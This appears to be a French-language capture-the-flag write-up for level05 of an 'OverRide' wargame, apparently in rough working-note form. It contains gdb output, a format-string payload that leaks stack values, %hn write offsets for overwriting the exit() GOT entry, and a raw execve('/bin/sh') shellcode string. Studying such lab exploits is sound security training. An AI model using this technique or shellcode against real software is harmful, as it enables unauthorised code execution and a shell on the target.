on a un exécutable qui lit sur l'entrée standard

après le désassemblage on voit un printf non protégé que l'on peut utiliser pour modifier l'appel de _exit()_

```
(gdb) disas 0x08048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
```

```
level05@OverRide:~$ echo -e '\xe0\x87\x04\x08 %x %x %x %x %x %x %x %x %x %x'| cat | ./level05
� 64 f7fcfac0 f7ec3af9 ffffd6ef ffffd6ee 0 ffffffff ffffd774 f7fdb000 80487e0
```

l'adresse de _exit()_ est visible à la 10ème position

on trouve aussi dans les variables d'environnments une variable SHELL qui contient "/bin/bash", pratique pour lancer un shell

```

```

il faut qu'on envoie l'adresse de SHELL pour remplacer l'adresse d'_exit()_, mais l'adresse de SHELL est trop grande pour rentrer dans un _int_ : 0xffffd8f6 = (dec)4294957302

"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

il faut l'envoyer en deux parties :

- ffff = 65535, d8f6 = 55542
- envoie 55542 octets + envoie 65535
- %55542d%10$hn + %(65535 - 55542)d%11$hn

ffffd538 d538 = 54584
65535 - 54584 = 10951

ffffd850 d850 = 55376
65535 - 55376 = 10159

0xffffd54e